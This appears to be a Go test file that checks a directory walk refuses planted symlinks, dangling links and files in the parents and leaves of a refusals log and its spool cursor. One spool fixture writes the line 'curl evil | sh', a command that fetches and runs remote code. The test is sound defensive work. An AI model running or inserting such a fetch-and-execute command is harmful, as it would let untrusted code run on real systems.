//go:build posse_arm2

package posse

// ranger-base-byqv0: the directories ABOVE the refusals trail's leaves are
// walked through no link from StateDir (refusalleaf.go, "THE PARENTS TOO").
// Every directory component between StateDir and each leaf is planted, at
// every site that reaches it, with three shapes a planter outside a wall
// could leave there: a link to a real directory elsewhere, a dangling link,
// and a regular file. Each case asserts the call errors with
// errRefusalParent and that nothing was made in, or through, what the
// planter pointed at.
//
// The cursor gets the leaf plants too: writeSpoolCursor was os.WriteFile,
// which follows a leaf link and TRUNCATES its target.
//
// Mutants (MEASURED 2026-11-21, linux): dropping O_NOFOLLOW from the
// directory open (openRefusalDirAt) reds all 28 link rows below. Dropping
// O_DIRECTORY reds the regular-file row at each site's DEEPEST component
// only (5 rows) — a file higher up still fails the next openat with
// ENOTDIR, which is refused all the same. Removing the O_TRUNC guard and
// truncating in the cursor's open reds the cursor write's hardlink row (the
// target is cut before the fstat refuses). Dropping the cursor's Truncate
// reds the round-trip test (a shorter rewrite leaves a tail).

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

type parentPlant struct {
	name string
	// plant replaces dir with the shape and returns a check run after the
	// call: it fails the test if anything reached what the plant names.
	plant func(t *testing.T, dir string) func(t *testing.T)
}

func parentPlants() []parentPlant {
	return []parentPlant{
		{"symlink to a real directory", func(t *testing.T, dir string) func(*testing.T) {
			target := t.TempDir()
			if err := os.Symlink(target, dir); err != nil {
				t.Fatal(err)
			}
			return func(t *testing.T) {
				ents, err := os.ReadDir(target)
				if err != nil {
					t.Fatal(err)
				}
				if len(ents) != 0 {
					t.Errorf("the walk wrote through a linked parent: %s now holds %v", target, ents)
				}
			}
		}},
		{"dangling symlink", func(t *testing.T, dir string) func(*testing.T) {
			target := filepath.Join(t.TempDir(), "made-through-the-link")
			if err := os.Symlink(target, dir); err != nil {
				t.Fatal(err)
			}
			return func(t *testing.T) {
				if _, err := os.Lstat(target); !os.IsNotExist(err) {
					t.Errorf("the walk created a dangling link's target %s (lstat: %v)", target, err)
				}
			}
		}},
		{"regular file", func(t *testing.T, dir string) func(*testing.T) {
			leafWrite(t, dir, leafPrecious)
			return func(t *testing.T) {
				if b, _ := os.ReadFile(dir); string(b) != leafPrecious {
					t.Errorf("a file at a parent's name changed: %q", b)
				}
			}
		}},
	}
}

// parentSite is one uncaged call and the leaf it opens. prep runs before
// the plant (to give the call something to get past, e.g. a spool for the
// fold to read); components are the dirs between StateDir and the leaf the
// call itself walks, each relative to StateDir.
type parentSite struct {
	name       string
	components []string
	prep       func(t *testing.T, a *App)
	call       func(a *App) error
}

func parentSites() []parentSite {
	spool := func(t *testing.T, a *App) {
		if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
			t.Fatal(err)
		}
		leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
	}
	return []parentSite{
		{"RefusalsLog", []string{"gates", "gates/p"}, nil,
			func(a *App) error { _, err := a.RefusalsLog("p"); return err }},
		{"EnsureCageSpool", []string{"cages", "cages/p", "cages/p/s1"}, nil,
			func(a *App) error { _, err := a.EnsureCageSpool("p", "s1"); return err }},
		{"fold reading the spool", []string{"cages", "cages/p", "cages/p/s1"}, nil,
			func(a *App) error { return a.FoldRefusalsSpool("p", "s1") }},
		{"fold appending to the canonical log", []string{"gates", "gates/p"}, spool,
			func(a *App) error { return a.FoldRefusalsSpool("p", "s1") }},
		{"fold reading the cursor", []string{"gates/p/spool-cursors"}, func(t *testing.T, a *App) {
			spool(t, a)
			if _, err := a.RefusalsLog("p"); err != nil {
				t.Fatal(err)
			}
		}, func(a *App) error { return a.FoldRefusalsSpool("p", "s1") }},
		{"writeSpoolCursor", []string{"gates", "gates/p", "gates/p/spool-cursors"}, nil,
			func(a *App) error {
				return writeSpoolCursor(a.StateDir, a.spoolCursorPath("p", "s1"), spoolCursor{Offset: 1, Hash: "h"})
			}},
	}
}

func TestRefusalsTrailRefusesAPlantedParent(t *testing.T) {
	t.Parallel()
	for _, site := range parentSites() {
		for _, comp := range site.components {
			for _, pl := range parentPlants() {
				t.Run(site.name+"/"+comp+"/"+pl.name, func(t *testing.T) {
					t.Parallel()
					a := cageApp(t)
					if site.prep != nil {
						site.prep(t, a)
					}
					dir := filepath.Join(a.StateDir, filepath.FromSlash(comp))
					// Make everything above the planted component real, and
					// clear the component itself if prep made it.
					if err := os.MkdirAll(filepath.Dir(dir), 0o755); err != nil {
						t.Fatal(err)
					}
					if err := os.RemoveAll(dir); err != nil {
						t.Fatal(err)
					}
					check := pl.plant(t, dir)
					err := site.call(a)
					if !errors.Is(err, errRefusalParent) {
						t.Fatalf("want errRefusalParent for a %s at %s, got %v", pl.name, comp, err)
					}
					if !strings.Contains(err.Error(), dir) {
						t.Errorf("the refusal must name the planted directory %s: %v", dir, err)
					}
					check(t)
				})
			}
		}
	}
}

// The fold's cursor leaf, planted with each leaf shape. A refusal on the
// READ of a planted cursor stops the fold before it appends anything; the
// write is pinned directly, because os.WriteFile through a leaf link cut its
// target to zero.
func TestSpoolCursorRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run("write/"+pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.spoolCursorPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error {
				return writeSpoolCursor(a.StateDir, leaf, spoolCursor{Offset: 1, Hash: "h"})
			})
			assertLeafRefused(t, err, keep, absent)
		})
		t.Run("fold/"+pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
				t.Fatal(err)
			}
			leafWrite(t, a.CageSpoolPath("p", "s1"), "one\n")
			leaf := a.spoolCursorPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if b, rerr := os.ReadFile(a.RefusalsLogPath("p")); rerr == nil && len(b) > 0 {
				t.Errorf("a fold over a refused cursor appended: %q", b)
			}
		})
	}
}

// The ordinary shapes still work through the walk: a cursor is created,
// rewritten shorter without a stale tail, and read back.
func TestSpoolCursorRoundTripsThroughTheWalk(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	p := a.spoolCursorPath("p", "s1")
	if err := writeSpoolCursor(a.StateDir, p, spoolCursor{Offset: 123456, Hash: "longerhash"}); err != nil {
		t.Fatal(err)
	}
	if err := writeSpoolCursor(a.StateDir, p, spoolCursor{Offset: 7, Hash: "h"}); err != nil {
		t.Fatal(err)
	}
	c, ok, err := readSpoolCursor(a.StateDir, p)
	if err != nil || !ok || c != (spoolCursor{Offset: 7, Hash: "h"}) {
		t.Fatalf("round trip: %+v %v %v", c, ok, err)
	}
	if b, _ := os.ReadFile(p); string(b) != "7 h\n" {
		t.Errorf("a shorter rewrite left a tail: %q", b)
	}
	if _, ok, err := readSpoolCursor(a.StateDir, a.spoolCursorPath("p", "never")); ok || err != nil {
		t.Errorf("an absent cursor must read as none, not an error: %v %v", ok, err)
	}
}
